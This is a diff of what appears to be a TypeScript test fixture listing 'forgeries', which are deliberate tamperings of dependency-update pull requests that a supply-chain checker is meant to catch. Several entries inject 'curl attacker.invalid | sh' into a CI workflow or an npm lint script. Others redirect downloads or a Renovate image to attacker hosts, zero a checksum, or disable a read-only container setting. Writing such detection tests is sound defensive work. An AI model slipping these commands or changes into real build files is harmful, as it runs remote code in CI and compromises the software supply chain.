@@ -53,16 +53,6 @@ const forgeries: readonly Forgery[] = [
     pullRequest: 149,
   },
   {
-    forge: (text) =>
-      text.replace(
-        'install_args: golangci-lint',
-        'install_args: golangci-lint\n      - run: curl attacker.invalid | sh',
-      ),
-    name: 'a run step next to the mise update',
-    path: '.github/workflows/ci.yml',
-    pullRequest: 150,
-  },
-  {
     forge: (text) => text.replace('"lint": "', '"lint": "curl attacker.invalid | sh && '),
     name: 'a script change next to the package update',
     path: 'web/package.json',
@@ -76,22 +66,41 @@ const forgeries: readonly Forgery[] = [
     pullRequest: 148,
   },
   {
+    forge: (text) => text.replace('read_only: true', 'read_only: false'),
+    name: 'a container setting next to the image digest update',
+    path: 'deploy/compose/compose.yaml',
+    pullRequest: 186,
+  },
+  {
+    forge: (text) => text.replace('bb65249542db5fedeeb4d3f9b018b75e7264dbfbbb10486f044581a92f90490d', '0'.repeat(64)),
+    name: 'a checksum that is not the upstream digest',
+    path: 'tools/dependencies/assets.json',
+    pullRequest: 187,
+  },
+  {
+    forge: (text) =>
+      text.replace('      - name: Archive', '      - run: curl attacker.invalid | sh\n      - name: Archive'),
+    name: 'a run step next to the GoReleaser update',
+    path: '.github/workflows/ci.yml',
+    pullRequest: 189,
+  },
+  {
     forge: (text) => text.replace('https://github.com/goreleaser/', 'https://attacker.invalid/goreleaser/'),
     name: 'a foreign download host in the mise lock update',
     path: 'mise.lock',
-    pullRequest: 176,
-  },
-  {
-    forge: (text) => text.replace('f56cc56b462eaae60aa7a33dffd24f641847b52e098b69e4a5064c4b8bbe03cb', '0'.repeat(64)),
-    name: 'a checksum that is not the upstream digest',
-    path: 'tools/dependencies/assets.json',
-    pullRequest: 150,
+    pullRequest: 189,
   },
   {
     forge: (text) => text.replace('2.19.0', '3.0.0'),
     name: 'a major version in the mise configuration',
     path: 'mise.toml',
-    pullRequest: 176,
+    pullRequest: 189,
+  },
+  {
+    forge: (text) => text.replace('ghcr.io/renovatebot/renovate:', 'ghcr.io/attacker/renovate:'),
+    name: 'a Renovate image from another repository',
+    path: '.github/workflows/renovate.yml',
+    pullRequest: 193,
   },
 ];
 
